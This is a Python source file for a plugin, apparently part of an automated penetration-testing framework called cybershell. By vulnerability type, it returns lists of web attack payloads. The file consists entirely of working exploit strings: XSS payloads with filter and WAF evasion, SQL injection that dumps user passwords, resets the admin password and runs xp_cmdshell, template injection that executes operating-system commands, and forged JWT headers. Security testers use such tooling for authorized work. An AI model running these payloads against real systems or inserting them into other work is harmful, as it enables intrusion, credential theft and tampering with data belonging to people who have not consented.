import base64
import urllib.parse
import string
import random
from typing import Dict, List, Any
from cybershell.plugins import PluginBase, PluginResult

class AdvancedPayloadPlugin(PluginBase):
    def __init__(self):
        super().__init__()
        self.name = "AdvancedPayloadPlugin"
        self.description = "Dynamic payload generation with evasion techniques"
        
    def execute(self, context: Dict[str, Any]) -> Dict[str, Any]:
        vuln_type = context.get('vulnerability_type', '')
        target_info = context.get('target_info', {})
        
        payloads = []
        
        if 'xss' in vuln_type.lower():
            payloads = self._generate_xss_payloads(target_info)
        elif 'sqli' in vuln_type.lower():
            payloads = self._generate_sqli_payloads(target_info)
        elif 'ssti' in vuln_type.lower():
            payloads = self._generate_ssti_payloads(target_info)
        elif 'jwt' in vuln_type.lower():
            payloads = self._generate_jwt_payloads(target_info)
            
        return {
            'payloads': payloads,
            'success': True,
            'evidence_score': 0.8
        }
    
    def _generate_xss_payloads(self, target_info: Dict) -> List[str]:
        """Generate advanced XSS payloads with filter bypassing techniques"""
        base_payloads = [
            # HTML entity encoding (like XBOW used)
            "&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;",
            # Unicode encoding
            "\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0058\\u0053\\u0053\\u0027\\u0029",
            # Event handlers
            'onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))',
            # Template literals
            "onerror=eval`String.fromCharCode(97,108,101,114,116,96,88,83,83,96)`",
            # DOM breaking
            '"><svg/onload=alert(`XSS`)>',
            # WAF bypass combinations
            "<ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>",
            # Polyglot
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
        ]
        
        # Context-aware encoding
        context = target_info.get('context', 'html')
        encoded_payloads = []
        
        for payload in base_payloads:
            if context == 'url':
                encoded_payloads.append(urllib.parse.quote(payload))
            elif context == 'double_quoted':
                encoded_payloads.append(payload.replace('"', '\\"'))
            else:
                encoded_payloads.append(payload)
                
        return base_payloads + encoded_payloads
    
    def _generate_sqli_payloads(self, target_info: Dict) -> List[str]:
        """Generate advanced SQL injection payloads"""
        return [
            # Boolean-based blind
            "' OR (SELECT '1' FROM users WHERE username='admin' AND LENGTH(password)>10)='1",
            # Time-based blind
            "'; IF (1=1) WAITFOR DELAY '00:00:05'--",
            # Union-based
            "' UNION SELECT NULL,username,password FROM users--",
            # Error-based
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            # Second-order
            "admin'; UPDATE users SET password='hacked' WHERE username='admin'--",
            # NoSQL injection
            "' || '1'=='1",
            # PostgreSQL specific
            "'; SELECT pg_sleep(5)--",
            # MSSQL specific
            "'; EXEC xp_cmdshell('ping 127.0.0.1')--"
        ]
    
    def _generate_ssti_payloads(self, target_info: Dict) -> List[str]:
        """Generate Server-Side Template Injection payloads (like XBOW used)"""
        return [
            # Jinja2 (Flask)
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            
            # Django
            "{% load os %}{{ os.system('id') }}",
            
            # Smarty
            "{php}echo `id`;{/php}",
            
            # Freemarker
            "${'freemarker.template.utility.Execute'?new()('id')}",
            
            # Velocity
            "#set($str=$class.forName('java.lang.String'))",
            
            # Twig
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            
            # Basic detection
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}"
        ]
    
    def _generate_jwt_payloads(self, target_info: Dict) -> List[str]:
        """Generate JWT manipulation payloads"""
        return [
            # Algorithm confusion
            '{"alg":"none","typ":"JWT"}',
            '{"alg":"HS256","typ":"JWT"}',
            
            # Key confusion
            '{"alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","n":"1"}}',
            
            # Claims manipulation
            '{"admin":true,"user":"admin"}',
            '{"exp":9999999999,"user":"admin"}'
        ]
